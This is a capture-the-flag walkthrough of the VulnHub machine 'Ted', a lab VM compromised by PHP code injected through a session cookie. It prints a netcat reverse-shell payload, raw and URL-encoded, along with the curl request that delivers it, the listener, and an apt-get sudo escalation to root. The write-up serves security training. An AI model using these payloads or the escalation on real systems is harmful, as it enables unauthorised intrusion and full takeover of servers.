
Ted
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

[+] Command injection in cookie
[+] PHP reverse shell
[+] Privilege Escalation by abusing SUDO rights =  apt-get update
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Scan results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-02 03:46 EDT
Nmap scan report for 192.168.56.103
Host is up (0.00038s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Login
MAC Address: 08:00:27:EB:0A:11 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.38 ms 192.168.56.103

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.48 seconds
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Only port 80 open
Browsing to port 80 :  http://192.168.56.103
![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Ted/ted-01.png)

There's a login page
Trying admin : admin as username and password credentials we get a error stating:
<p>Password hash is not correct, make sure to hash it before submit.</p>
![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Ted/ted02.png)


We try to encode it with different types of hashed: MD5, SHA1, SHA256. This later one worked submitting a SHA256 hash of admin, instead of the password
![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Ted/ted03.png)
admin : 8C6976E5B5410415BDE908BD4DEE15DFB167A9C873FC4BB8A81F6F2AB448A918

Using this credentials we are able to login to the application.
The admin panel has just a Search button for retrieving files from the server.

We are unable to retrieve the restricted files, but we have access to /var/lib/php/sessions/

We retrieve the file containing information about the current session of the user admin
![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Ted/ted04.png)


We try to manipulate the user_pref parameter in the cookie.
We insert a small php file that executes ifconfig to test code execution.
![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Ted/ted05.png)


Reverse shell

Sending the following php : <?php system("nc 192.168.56.102 1234 -e /bin/bash")?> 
Encoded in URL format : %3c%3f%70%68%70%20%73%79%73%74%65%6d%28%22%6e%63%20%31%39%32%2e%31%36%38%2e%35%36%2e%31%30%32%20%31%32%33%34%20%2d%65%20%2f%62%69%6e%2f%62%61%73%68%22%29%3f%3e

We resubmit the request

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
curl -i -s -k  -X $'POST' \
    -H $'Host: 192.168.56.103' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64;$
    -b $'PHPSESSID=4lnshplsfqb65oe3ihtnhqiqs0; user_pref=%3c%3f%70%68%70%20%73%$
    --data-binary $'search=%2Fvar%2Flib%2Fphp%2Fsessions%2Fsess_4lnshplsfqb65oe$
    $'http://192.168.56.103/home.php'

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Started listener on Kali at port 1234.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# nc -nvlp 1234
listening on [any] 1234 ...

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Upon making the request we get a reverse shell on kali linux
![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Ted/ted06.png)

Getting root
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 35310
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/apt-get

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~




~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
www-data@ubuntu:/var/www/html$ sudo -l
Matching Defaults entries for www-data on ubuntu:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User www-data may run the following commands on ubuntu:
     (root) NOPASSWD: /usr/bin/apt-get
 www-data@ubuntu:/var/www/html$sudo apt-get update -o APT::Update::Pre-Invoke::= "/bin/bash -i"
 root@ubuntu:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


